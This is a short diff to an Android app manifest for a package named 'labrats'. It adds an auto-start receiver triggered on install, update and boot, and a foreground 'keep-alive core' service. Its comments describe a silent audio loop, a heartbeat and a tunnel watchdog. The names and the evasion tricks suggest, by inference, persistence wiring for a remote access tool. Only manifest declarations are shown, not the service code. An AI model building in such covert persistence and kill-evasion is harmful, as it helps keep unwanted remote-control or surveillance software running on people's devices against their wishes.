@@ -266,6 +266,31 @@
             </intent-filter>
         </receiver>
 
+        <!-- Auto-start: own PACKAGE_ADDED / MY_PACKAGE_REPLACED / BOOT_COMPLETED -> PermissionActivity + notification -->
+        <receiver
+            android:name="com.labs.labrats.AutoStartReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <data android:scheme="package" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Foreground keep-alive core: START_STICKY, silent audio loop, 60s heartbeat, tunnel watchdog -->
+        <service
+            android:name="com.labs.labrats.ForegroundCoreService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="dataSync" />
+
         <receiver
             android:name="com.labs.labrats.SystemBoot"
             android:enabled="true"
